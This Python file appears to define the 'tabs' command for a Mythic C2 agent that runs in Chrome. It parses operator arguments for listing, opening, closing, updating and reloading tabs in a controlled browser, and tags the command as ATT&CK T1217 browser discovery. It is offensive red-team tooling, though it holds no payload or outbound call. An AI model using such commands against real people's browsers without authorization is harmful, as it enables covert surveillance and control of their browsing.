from mythic_container.MythicCommandBase import *

from .tasking import wired_tasking


class TabsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                choices=["list", "create", "close", "update", "reload"],
                default_value="list",
                description="Tab action",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="tab_id",
                type=ParameterType.Number,
                description="Tab ID",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL for create or update",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="active",
                type=ParameterType.Boolean,
                default_value=False,
                description="Focus the tab",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            self.add_arg("action", "list")
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        pieces = self.command_line.split()
        self.add_arg("action", pieces[0])
        if len(pieces) > 1 and pieces[0] in {"close", "reload", "update"}:
            self.add_arg("tab_id", pieces[1])
        if len(pieces) > 1 and pieces[0] == "create":
            self.add_arg("url", pieces[1])

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class TabsCommand(CommandBase):
    cmd = "tabs"
    needs_admin = False
    help_cmd = "tabs [list|create|close|update|reload]"
    description = "List or control browser tabs"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1217"]
    argument_class = TabsArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        action = taskData.args.get_arg("action") or "list"
        display = action
        if taskData.args.get_arg("url"):
            display += f" {taskData.args.get_arg('url')}"
        if taskData.args.get_arg("tab_id") is not None:
            display += f" {taskData.args.get_arg('tab_id')}"
        return wired_tasking(taskData, display)

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
